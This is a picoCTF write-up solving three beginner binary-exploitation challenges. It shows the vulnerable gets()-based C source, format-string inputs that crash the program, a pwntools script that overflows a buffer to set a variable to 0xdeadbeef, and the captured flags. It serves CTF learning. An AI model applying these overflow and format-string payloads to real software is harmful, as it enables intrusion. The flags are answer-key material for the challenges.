# 1. buffer overflow 0

## Description:

Let's start off simple, can you overflow the correct buffer? The program is available [here](BE/vuln). You can view source [here](BE/vuln.c). Connect using: `nc saturn.picoctf.net 53502`

## Solution:

In this challenge, we have been given a bunch of stuff. Thankfully, we don't need any of it. We can just `nc` into the server and port given to us and spam a very long input and it will give us the flag. To get the flag, I just spammed the letter a 557 times.

Using trial and error, the minimum number of a's needed to perform the buffer overflow seems to be 20.

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts learnt:

- Cheese

***

# 2. format string 0

## Description:

Description
Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here. Connect with the challenge instance here: `nc mimas.picoctf.net 62443`

## Solution:

For the first one, choose `Gr%114d_Cheese`. Its length will be greatly inflated because of the `%114d`. For the second one, choose `Cla%sic_Che%s%steak`. This will completely break the program and the flag will be printed.

```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts learnt:

- Handle strings carefully ig

***

# 3. clutter-overflow

## Description:

Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`

[chall.c](BE/chall.c)

[chall](BE/chall)

## Solution:

In this challenge, we have been given a `chall` program and its source code `chall.c`. To get the flag, we must analyse the program locally and develop a payload which we can then run in the program instance running on the given server. Lets start by taking a look at `chall.c`.

<details closed>
<summary><i>chall.c</i></summary>

```c
 1  #include <stdio.h>
 2  #include <stdlib.h>
 3
 4  #define SIZE 0x100
 5  #define GOAL 0xdeadbeef
 6
 7  const char* HEADER = 
 8  " ______________________________________________________________________\n"
 9  "|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
10  "| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
11  "|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
12  "| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
13  "|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
14  "| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
15  "|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
16  "| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
17  "|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
18  ".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
19  "|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
20  "| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
21  "|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
22  "|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
23  "\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
24  "\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
25  "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
26  "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";
27
28  int main(void)
29  {
30    long code = 0;
31    char clutter[SIZE];
32
33    setbuf(stdout, NULL);
34    setbuf(stdin, NULL);
35    setbuf(stderr, NULL);
36   
37    puts(HEADER); 
38    puts("My room is so cluttered...");
39    puts("What do you see?");
40
41    gets(clutter);
42
43
44    if (code == GOAL) {
45      printf("code == 0x%llx: how did that happen??\n", GOAL);
46      puts("take a flag for your troubles");
47      system("cat flag.txt");
48    } else {
49      printf("code == 0x%llx\n", code);
50      printf("code != 0x%llx :(\n", GOAL);
51    }
52
53    return 0;
54  }
```

</details>

In this program, `code` is set to `0` and then, a string `clutter` is made of size `0x100` which is `256` in decimal. Then, `gets` is used to take an input into the `clutter` variable. Our goal is to somehow use this to make the `code` variable equal to `0xdeadbeef` in little endian notation.

To do this, we must run the program, and then when asked for input, we must enter 264 bytes of random stuff followed by `0xefbeadde` in ascii. However, since `0xefbeadde` doesnt translate nicely into ascii, giving `"ï¾­Þ"`, and since the required input is so long, it is be better to use a script to do this.

```py
from pwn import * 

p = remote('mars.picoctf.net', 31890)
payload = b'A' * 264

payload += p64(0xdeadbeef)
p.sendline(payload)

response = p.recvline()
print(f"{response.decode().strip()}")
print(payload)
p.interactive()
```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- Buffer Overflows
- Using Overflows to overwrite variables

## Resources:

- [First Stack Buffer Overflow to modify Variable - bin 0x0C](https://youtu.be/T03idxny9jE?)
